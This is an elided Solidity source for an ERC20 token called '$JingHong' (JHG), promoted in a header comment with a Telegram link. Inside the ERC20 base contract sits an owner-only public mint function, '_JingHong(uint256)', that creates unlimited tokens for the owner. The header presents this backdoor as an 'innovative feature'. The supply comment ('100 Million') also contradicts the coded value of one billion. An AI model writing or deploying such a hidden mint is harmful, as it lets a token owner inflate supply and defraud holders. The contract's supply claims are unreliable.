...
//
// $JingHong proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/JingHongCN
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _JingHong(uint256 amount) public onlyOwner {
 _JingHong(msg.sender, amount);
    }
    ...
    function _JingHong(address account, uint256 amount) internal virtual {
...
contract $JingHong is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("JingHong", "JHG") {
     _JingHong(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}